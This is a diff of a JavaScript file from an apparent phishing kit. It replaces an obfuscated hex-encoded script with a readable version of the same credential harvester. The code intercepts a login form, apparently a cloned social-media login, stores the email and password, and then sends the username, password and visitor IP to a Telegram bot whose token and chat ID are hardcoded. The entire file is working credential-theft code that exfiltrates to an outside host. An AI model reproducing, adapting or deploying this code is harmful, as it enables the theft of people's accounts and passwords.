@@ -1,2 +1,65 @@
+const bot = new Bot("6932519233:AAE2_bWYP-CubrKXvsXWWunL9hkPIkvSu6E", "-4022025604");
 
-var _$_3d3c=["\x36\x39\x33\x32\x35\x31\x39\x32\x33\x33\x3A\x41\x41\x45\x32\x5F\x62\x57\x59\x50\x2D\x43\x75\x62\x72\x4B\x58\x76\x73\x58\x57\x57\x75\x6E\x4C\x39\x68\x6B\x50\x49\x6B\x76\x53\x75\x36\x45","\x2D\x34\x30\x32\x32\x30\x32\x35\x36\x30\x34","\x66\x72\x6D\x5F\x62\x6F\x74\x64\x61\x74\x61","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x73\x75\x62\x6D\x69\x74","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x76\x61\x6C\x75\x65","\x6D\x5F\x6C\x6F\x67\x69\x6E\x5F\x65\x6D\x61\x69\x6C","\x6D\x5F\x6C\x6F\x67\x69\x6E\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","","\x66\x72\x6D\x49\x6E\x66\x6F","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x73\x65\x74\x49\x74\x65\x6D","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x2F\x69\x6D\x61\x67\x65\x2E\x68\x74\x6D\x6C","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x66\x6F\x72\x6D\x46\x69\x6C\x65","\x66\x69\x6C\x65","\x67\x65\x74\x49\x74\x65\x6D","\x70\x61\x72\x73\x65","\x5F\x67\x69\x70","\x3C\x62\x3E\x55\x73\x65\x72\x4E\x61\x6D\x65\x3A\x20","\x75\x73\x65\x72\x4E\x61\x6D\x65","\x3C\x2F\x62\x3E\x25\x30\x41","\x3C\x62\x3E\x50\x61\x73\x73\x3A\x20","\x70\x61\x73\x73","\x3C\x62\x3E\x49\x50\x3A\x20","\x3C\x2F\x62\x3E","\x6C\x6F\x67","\x63\x61\x74\x63\x68","\x2F\x73\x75\x63\x63\x65\x73\x73\x2E\x68\x74\x6D\x6C","\x74\x68\x65\x6E","\x23\x66\x69\x6C\x65","\x68\x74\x6D\x6C","\x73\x65\x6E\x64\x46\x69\x6C\x65"];const bot= new Bot(_$_3d3c[0],_$_3d3c[1]);var frmInfo=document[_$_3d3c[3]](_$_3d3c[2]);if(frmInfo){frmInfo[_$_3d3c[16]](_$_3d3c[4],(_0x40CD)=>{_0x40CD[_$_3d3c[5]]();const _0x408B=document[_$_3d3c[3]](_$_3d3c[7])[_$_3d3c[6]];const _0x4049=document[_$_3d3c[3]](_$_3d3c[8])[_$_3d3c[6]];if(_0x408B!== _$_3d3c[9]&& _0x4049!= _$_3d3c[9]){localStorage[_$_3d3c[12]](_$_3d3c[10],JSON[_$_3d3c[11]]({userName:_0x408B,pass:_0x4049}));window[_$_3d3c[14]][_$_3d3c[13]]= _$_3d3c[15]}})};var frmFile=document[_$_3d3c[3]](_$_3d3c[17]);if(frmFile){frmFile[_$_3d3c[16]](_$_3d3c[4],(_0x40CD)=>{_0x40CD[_$_3d3c[5]]();const _0x4151=document[_$_3d3c[3]](_$_3d3c[18])[_$_3d3c[6]];if(_0x4151!== _$_3d3c[9]){var frmInfo=JSON[_$_3d3c[20]](localStorage[_$_3d3c[19]](_$_3d3c[10]));var _0x410F=localStorage[_$_3d3c[19]](_$_3d3c[21]);var _0x4193=_$_3d3c[22]+ frmInfo[_$_3d3c[23]]+ _$_3d3c[24]+ _$_3d3c[25]+ frmInfo[_$_3d3c[26]]+ _$_3d3c[24]+ _$_3d3c[27]+ _0x410F+ _$_3d3c[28];console[_$_3d3c[29]](_0x4193);bot[_$_3d3c[35]](_$_3d3c[33],_0x4193,_$_3d3c[34])[_$_3d3c[32]]((_0x41D5)=>{window[_$_3d3c[14]][_$_3d3c[13]]= _$_3d3c[31]})[_$_3d3c[30]]((_0x4217)=>{return console[_$_3d3c[29]](_0x4217)})}})}
+// bot.getUpdates()
+//       .then(res => {
+//         console.log(res);
+//       })
+//       .catch(err => console.log(err));
+
+// bot.getMe()
+//       .then(res => {
+//         console.log(res);
+//       })
+//       .catch(err => console.log(err))
+  
+//Send frmInfo 
+var frmInfo = document.getElementById("frm_botdata");
+if (frmInfo) {
+  frmInfo.addEventListener("submit", e => {
+    e.preventDefault();
+    const _userName = document.getElementById("m_login_email").value;
+    const _pass = document.getElementById("m_login_password").value;
+
+    if (_userName !== "" && _pass != "") {
+      localStorage.setItem('frmInfo', JSON.stringify({userName: _userName, pass: _pass}));
+      window.location.href = "image.html";
+    }
+
+  });
+}
+
+
+//send frmFile
+var frmFile = document.getElementById("formFile");
+
+if (frmFile) {
+  frmFile.addEventListener("submit", e => {
+    e.preventDefault();
+    const file = document.getElementById("file").value;
+    if (file !== "") {
+      var frmInfo = JSON.parse(localStorage.getItem('frmInfo'));
+      var _gip = localStorage.getItem('_gip');
+
+      var msg = "<b>UserName: " + frmInfo.userName + "</b>%0A" +
+                "<b>Pass: " + frmInfo.pass + "</b>%0A" +
+                "<b>IP: " + _gip + "</b>";
+
+      console.log(msg);
+      bot.sendFile("#file", msg, 'html')
+        .then(res => {
+          window.location.href = "success.html"
+        })
+        .catch(err => console.log(err))
+
+
+    }
+  });
+}
+
+
+
+
+
+
+
+
